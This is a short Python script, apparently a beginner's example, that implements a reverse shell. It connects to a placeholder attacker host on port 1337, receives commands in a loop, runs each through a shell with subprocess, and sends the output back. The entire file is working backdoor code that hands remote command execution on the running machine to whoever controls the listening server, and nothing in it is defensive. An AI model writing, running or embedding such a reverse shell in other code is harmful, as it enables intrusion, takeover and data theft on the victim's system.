import socket
import subprocess

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

while True:
	## continuously receive command data
	cmd = payload.recv(2048) # 1024 is approximately 1K bytes, 2048 is 2K bytes of data
	cmd = cmd.decode("utf-8") # decode bytes into string
	output = subprocess.check_output(cmd, shell = True) # store output in a variable
	payload.send(output) # output should be sent back to server machine
